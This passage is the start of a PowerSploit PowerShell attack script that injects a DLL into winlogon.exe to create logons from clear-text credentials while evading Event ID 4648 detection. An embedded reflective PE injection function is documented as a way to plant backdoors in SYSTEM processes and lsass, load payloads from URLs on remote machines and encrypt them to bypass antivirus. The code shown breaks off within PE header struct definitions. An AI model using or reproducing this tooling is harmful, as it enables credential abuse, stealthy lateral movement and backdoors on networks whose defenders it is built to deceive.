function Inject-LogonCredentials
{
    <#
    .SYNOPSIS

    This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
    logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.

    PowerSploit Function: Inject-LogonCredentials
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0

    .DESCRIPTION

    This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
    logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.

    .PARAMETER NewWinLogon

    Switch. Specifies that this script should create a new WinLogon.exe process. This may be suspicious, as log correlation can show winlogon.exe was 
    created by PowerShell.exe.

    .PARAMETER ExistingWinLogon

    Switch. Specifies that this script should use an existing WinLogon.exe process. This will leave behind code (a reflectively loaded DLL) in the process.

    .PARAMETER DomainName

    The domain name of the user account.

    .PARAMETER UserName

    The username to log in with.

    .PARAMETER Password

    The password of the user.

    .PARAMETER LogonType

    The logon type of the injected logon. Can be Interactive, RemoteInteractive, or NetworkCleartext

    .PARAMETER AuthPackage

    The authentication package to use. Default is Kerberos. Msv1_0 can be specified but should only be used for local accounts (which can't use kerberos).

	
    .EXAMPLE

    Inject-LogonCredentials -DomainName "demo" -UserName "administrator" -Password "Password1" -NewWinLogon

    Creates a new winlogon process (as the SYSTEM account) and creates a logon from within the process as demo\administrator. The logon will default to
    RemoteInteractive (an RDP logon). Defaults to using the Kerberos provider.

    .EXAMPLE

    Inject-LogonCredentials -DomainName "demo" -UserName "administrator" -Password "Password1" -ExistingWinLogon -LogonType NetworkCleartext

    Uses an existing winlogon process and creates a loogn from within it as demo\administrator. The logon will be type NetworkCleartext (used in basic auth
    and PowerShell w/ CredSSP). Defaults to using the Kerberos provider.

    .EXAMPLE

    Inject-LogonCredentials -DomainName "demo" -UserName "administrator" -Password "Password1" -NewWinLogon -AuthPackage Msv1_0

    Creates a new winlogon process (as the SYSTEM account) and creates a logon from within the process as demo\administrator. The logon will default to 
    RemoteInteractive (and RDP logon). The logon will use the Msv1_0 auth package (NTLM).

    .NOTES
    Normally when you do a RunAS logon, the EventID 4648 will show your current account, current process, and the account you are logging in with.
    Incident responders use this to look for lateral movement. They can see a random user logging in with high privilege credentials, which stands out.
    This script allows you to create the logon from within winlogon.exe, as SYSTEM. This allows you to create 4648 event logs which make it appear that the
    user logged in using RDP or logged in locally, rather than the logon showing up as a suspicious RunAS. Then you can use token kidnapping, such as the
    Invoke-TokenManipulation script to kidnap the security token. This token can then be used to authenticate over the network for pivoting and other post
    exploitation.

    .LINK

    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell

    #>

    [CmdletBinding()]
    Param(
        [Parameter(ParameterSetName = "NewWinLogon", Position = 0)]
	    [Switch]
	    $NewWinLogon,

        [Parameter(ParameterSetName = "ExistingWinLogon", Position = 0)]
	    [Switch]
	    $ExistingWinLogon,

        [Parameter(Position=1, Mandatory=$true)]
        [String]
        $DomainName,

        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $UserName,

        [Parameter(Position=3, Mandatory=$true)]
        [String]
        $Password,

        [Parameter()]
        [ValidateSet("Interactive","RemoteInteractive", "NetworkCleartext")]
        [String]
        $LogonType = "RemoteInteractive",

        [Parameter()]
        [ValidateSet("Kerberos","Msv1_0")]
        [String]
        $AuthPackage = "Kerberos"
    )

    Set-StrictMode -Version 2




    function Invoke-ReflectivePEInjection
    {
    <#
    .SYNOPSIS

    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
    please lead the Notes section (GENERAL NOTES) for information on how to use them.


    1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
    Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

    This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
    this will load and execute the DLL/EXE in to memory without writing any files to disk.


    2.) Reflectively load a DLL in to memory of a remote process.
    As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

    This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
    remote process. 


    While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
    containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
    bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
    blog linked below (thanks to whitey).

    PowerSploit Function: Invoke-ReflectivePEInjection
    Author: Joe Bialek, Twitter: @JosephBialek
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.1

    .DESCRIPTION

    Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

    .PARAMETER PEPath

    The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.

    .PARAMETER PEUrl

    A URL containing a DLL/EXE to load and execute.

    .PARAMETER ComputerName

    Optional, an array of computernames to run the script on.

    .PARAMETER FuncReturnType

    Optional, the return type of the function being called in the DLL. Default: Void
	    Options: String, WString, Void. See notes for more information.
	    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
    .PARAMETER ExeArgs

    Optional, arguments to pass to the executable being reflectively loaded.
	
    .PARAMETER ProcName

    Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

    .PARAMETER ProcId

    Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
	
    .EXAMPLE

    Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
    Note that the file name on the website can be any file extension.
    Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString

    .EXAMPLE

    Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local

    .EXAMPLE

    Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	    the wchar_t* returned by WStringFunc() from all the computers.
    Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

    .EXAMPLE

    Load DemoEXE and run it locally.
    Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"

    .EXAMPLE

    Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
    Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local

    .NOTES
    GENERAL NOTES:
    The script has 3 basic sets of functionality:
    1.) Reflectively load a DLL in to the PowerShell process
	    -Can return DLL output to user when run remotely or locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
	    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
    2.) Reflectively load an EXE in to the PowerShell process.
	    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	    -Cleans up memory in the PS process once the DLL finishes executing.
	    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
    3.) Reflectively inject a DLL in to a remote process.
	    -Can NOT return DLL output to the user when run remotely OR locally.
	    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
	    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.



    DLL LOADING NOTES:

    PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
    If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
    return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
    remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
    applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

    For DLL Loading:
    Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
    I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
    the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
    returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
    wchar_t*   : FuncReturnType = WString
    char*      : FuncReturnType = String
    void       : Default, don't supply a FuncReturnType

    For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
    using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

    The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
    WString    : WStringFunc
    String     : StringFunc
    Void       : VoidFunc

    These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
    be declared as follows:
    extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


    If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
    this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

    Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

    .LINK

    Blog: http://clymb3r.wordpress.com/
    Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection

    Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
    Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
    Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/

    #>

    [CmdletBinding()]
    Param(
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes32,
	
	    [Parameter(Mandatory = $true)]
	    [Byte[]]
	    $Bytes64,
	
	    [Parameter(Position = 1)]
	    [String[]]
	    $ComputerName,
	
	    [Parameter(Position = 2)]
        [ValidateSet( 'WString', 'String', 'Void' )]
	    [String]
	    $FuncReturnType = 'Void',
	
	    [Parameter(Position = 3)]
	    [String]
	    $ExeArgs,
	
	    [Parameter(Position = 4)]
	    [Int32]
	    $ProcId,
	
	    [Parameter(Position = 5)]
	    [String]
	    $ProcName
    )

    Set-StrictMode -Version 2


    $RemoteScriptBlock = {
	    [CmdletBinding()]
	    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $FuncReturnType,
				
		    [Parameter(Position = 2, Mandatory = $false)]
		    [Int32]
		    $ProcId,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [String]
		    $ProcName
	    )
	
	    ###################################
	    ##########  Win32 Stuff  ##########
	    ###################################
	    Function Get-Win32Types
	    {
		    $Win32Types = New-Object System.Object

		    #Define all the structures/enums that will be used
		    #	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		    $Domain = [AppDomain]::CurrentDomain
		    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		    ############    ENUM    ############
		    #Enum MachineType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		    $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		    $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		    $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		    $MachineType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		    #Enum MagicType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		    $MagicType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		    #Enum SubSystemType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		    $SubSystemType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		    #Enum DllCharacteristicsType
		    $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		    $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		    $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		    $DllCharacteristicsType = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		    ###########    STRUCT    ###########
		    #Struct IMAGE_DATA_DIRECTORY
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		    ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		    #Struct IMAGE_FILE_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		    $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		    $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		    #Struct IMAGE_OPTIONAL_HEADER64
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		    ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		    $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		    #Struct IMAGE_OPTIONAL_HEADER32
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		    ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		    ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		    $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
